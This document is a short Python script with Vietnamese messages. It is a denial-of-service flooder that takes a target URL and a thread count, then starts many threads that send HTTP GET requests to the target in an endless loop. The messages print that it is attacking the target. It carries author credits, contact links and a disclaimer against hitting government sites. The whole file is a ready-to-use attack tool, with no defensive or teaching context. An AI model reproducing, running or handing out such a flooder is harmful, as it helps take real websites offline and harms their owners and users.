import colorama
import threading
import requests
 
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("< / > Đang Tấn công mục tiêu chỉ định < / >")
        except requests.exceptions.ConnectionError:
            print("[ERR] " + "Kết Nối Bị Lỗi")
 
threads = 10

print("""


                                                                                                                  
                                                                                                                  
                                                                                                                  Bản 1.Việt hóa

""")

print('BẢN QUYỀN THUỘC VỀ LIONTEAM')
print('ADDONS BUFF STRONG BY GIAUY <3')
print('Zalo : https://zalo.me/nhatquyendev ')
print('FACEBOOK: LE THE GIA UY ')
print('MOD NÀY KHÔNG THUỘC VỀ HTB & HTK ')
print('KHÔNG ĐƯỢC ĐÁNH WEB CHÍNH PHỦ VÀ GOV! CHÚNG TÔI SẼ KHÔNG CHỊU TRÁCH NHIỆM CHO NHỮNG VIỆC BẠN ĐÃ LÀM ')
print('THÂN ÁI GỬI CÁC PET ')
url = input("Thêm URL Website (https//:nhatquyenit.net) >> ")
 
try:
    threads = int(input("Số Luồng (10.000) > "))
except ValueError:
    exit("Số Luồng Không Chính Xác")
 
if threads == 0:
    exit("Số Luồng Không Chính Xác")
 
if not url.__contains__("http"):
    exit("URL KHÔNG THÊM http or https")
 
if not url.__contains__("."):
    exit("Tên Miền Không Hợp Lệ")
 
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")
